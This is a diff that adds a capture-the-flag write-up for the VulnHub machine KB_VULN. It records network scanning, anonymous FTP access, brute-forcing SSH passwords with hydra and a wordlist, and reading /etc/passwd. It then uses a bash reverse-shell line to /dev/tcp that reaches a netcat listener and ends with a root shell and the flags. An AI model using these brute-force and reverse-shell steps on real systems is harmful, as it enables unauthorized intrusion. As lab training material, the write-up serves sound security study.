@@ -1,0 +1,307 @@
+KB_VULN
+
+HASHARMUJAHID 13-03-22
+------------------------------
+
+ENUMERATION 
+-----------
+
+HOST DISCOVERY
+--------------
+
+```
+
+
+ Currently scanning: 192.168.106.0/16   |   Screen View: Unique Hosts                                                                                                 
+                                                                                                                                                                      
+ 8 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 480                                                                                                      
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.100.4   04:79:70:f0:45:b7      3     180  HUAWEI TECHNOLOGIES CO.,LTD                                                                                        
+ 192.168.100.1   24:44:27:2a:9c:c0      3     180  HUAWEI TECHNOLOGIES CO.,LTD                                                                                        
+ 192.168.100.6   60:f6:77:8b:13:7f      1      60  Intel Corporate                                                                                                    
+ 192.168.100.38  08:00:27:09:6b:fc      1      60  PCS Systemtechnik GmbH 
+
+
+```
+
+
+
+
+NMAP
+----
+
+
+```
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/KB_VULN]
+└─$ sudo nmap  -p- -sV -sC --min-rate 2000  -Pn $IP  -oN nmap.txt 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 04:27 EDT
+Nmap scan report for 192.168.100.38
+Host is up (0.0022s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.100.33
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 95:84:46:ae:47:21:d1:73:7d:2f:0a:66:87:98:af:d3 (RSA)
+|   256 af:79:86:77:00:59:3e:ee:cf:6e:bb:bc:cb:ad:96:cc (ECDSA)
+|_  256 9d:4d:2a:a1:65:d4:f2:bd:5b:25:22:ec:bc:6f:66:97 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: OneSchool &mdash; Website by Colorlib
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+MAC Address: 08:00:27:09:6B:FC (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
+                                                              
+
+
+
+```
+
+---> FTP ANONYMOUS ALLOWED
+
+
+LETS LOOK IN TO THAT 
+
+
+FTP
+---
+
+```
+150 Here comes the directory listing.
+drwxrwxr-x    2 1000     1000         4096 Aug 22  2020 .
+drwxrwxr-x    2 1000     1000         4096 Aug 22  2020 ..
+-rw-r--r--    1 0        0              54 Aug 22  2020 .bash_history
+226 Directory send OK.
+ftp> get .bash_history
+local: .bash_history remote: .bash_history
+229 Entering Extended Passive Mode (|||45944|)
+150 Opening BINARY mode data connection for .bash_history (54 bytes).
+100% |**************************************************************************************************************************|    54        9.81 KiB/s    00:00 ETA
+226 Transfer complete.
+54 bytes received in 00:00 (7.34 KiB/s)
+ftp> ls
+229 Entering Extended Passive Mode (|||46425|)
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> exit
+221 Goodbye.
+
+
+bash-hostory
+
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/KB_VULN]
+└─$ cat bash_history    
+exit
+ls
+cd /etc/update-motd.d/
+ls
+nano 00-header
+exit
+           
+
+
+```
+
+HTTP
+-----
+
+```
+
+<!-- Username : sysadmin --> from index.html
+
+GOBuster
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/KB_VULN]
+└─$ gobuster dir -u http://192.168.100.38/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 80 --no-error  
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.100.38/
+[+] Method:                  GET
+[+] Threads:                 80
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/03/13 04:35:34 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 317] [--> http://192.168.100.38/images/]
+/css                  (Status: 301) [Size: 314] [--> http://192.168.100.38/css/]   
+/js                   (Status: 301) [Size: 313] [--> http://192.168.100.38/js/]    
+/fonts                (Status: 301) [Size: 316] [--> http://192.168.100.38/fonts/] 
+/server-status        (Status: 403) [Size: 279]                                    
+                                                                                   
+===============================================================
+2022/03/13 04:37:13 Finished
+===============================================================
+
+
+from /fonts 
+backup.txt (decoded)
+
+{"1":{"ID":1,"name":"My icons collection","bookmark_id":"59no1thgiy900000","created":null,"updated":1553168788,"active":1,"source":"local","order":0,"color":"000000","status":1},"59no1thgiy900000":[{"id":126488,"team":0,"name":"download","color":"#000000","premium":0,"sort":2},{"id":126512,"team":0,"name":"monitor","color":"#000000","premium":0,"sort":3},{"id":126500,"team":0,"name":"chat","color":"#000000","premium":0,"sort":4},{"id":126514,"team":0,"name":"glasses","color":"#000000","premium":0,"sort":5},{"id":126507,"team":0,"name":"vector","color":"#000000","premium":0,"sort":6},{"id":126502,"team":0,"name":"reload","color":"#000000","premium":0,"sort":1}]}
+
+```
+
+
+--->all WE GOT IS A USERNAME = sysadmin
+
+
+
+
+WE CAN BRUTE force ssh 
+-----------------------
+
+BRUTE FORCING 
+
+```
+
+hydra -v -V -u -l sysadmin -P /usr/share/wordlists/rockyou.txt -t 40 -u $IP ssh
+[ATTEMPT] target 192.168.100.38 - login "sysadmin" - pass "pretty" - 53 of 14344412 [child 37] (0/13)
+[22][ssh] host: 192.168.100.38   login: sysadmin   password: password1
+^C[ERROR] Received signal 2, going down ...
+[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+
+
+```
+
+
+
+SSH 
+---
+
+
+```
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/KB_VULN]
+└─$ ssh sysadmin@$IP                                              
+The authenticity of host '192.168.100.38 (192.168.100.38)' can't be established.
+ED25519 key fingerprint is SHA256:YqYTXGkivCGOSSwfW5lnCGt62N2WC6Z9Rdn+sjpl2YU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.100.38' (ED25519) to the list of known hosts.
+sysadmin@192.168.100.38's password: 
+
+                        WELCOME TO THE KB-SERVER
+
+Last login: Sat Aug 22 18:00:48 2020
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+sysadmin@kb-server:~$ 
+sysadmin@kb-server:~$ ls
+ftp  user.txt
+sysadmin@kb-server:~$ cat user.txt
+48a365b4ce1e322a55ae9017f3daf0c0
+
+
+our user in not in the lis to users lets find other users
+
+sysadmin@kb-server:/etc/update-motd.d$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash                                                                                                                                        
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                                        
+bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                                   
+sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                                   
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sysadmin:x:1000:1000:KernelBlog VM:/home/sysadmin:/bin/bash
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+eftipi:x:1001:1001:,,,:/home/eftipi:/bin/bash
+ftp:x:111:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+
+
+```
+
+USER= eftipi
+
+LETS brute HIS SSH 
+
+BRUTE FORCING 
+
+```
+
+hydra -v -V -u -l eftipi -P /usr/share/wordlists/rockyou.txt -t 40 -u $IP ssh
+
+[22][ssh] host: 192.168.100.38   login: eftipi   password: password3
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+
+```
+
+
+
+SSH OF EFTIPI
+
+```
+
+
+bash -i >& /dev/tcp/192.168.100.33/3434 0>&1
+
+```
+
+CHANGING USERS dOESNot HELP
+
+```
+
+
+└─$ nc -lnvp 3434                             
+listening on [any] 3434 ...
+connect to [192.168.100.33] from (UNKNOWN) [192.168.100.38] 52198
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls
+ls
+flag.txt
+# cat flag.txt
+cat flag.txt
+1eedddf9fff436e6648b5e51cb0d2ec7                                                  
+#                                                                                 
+             
+```
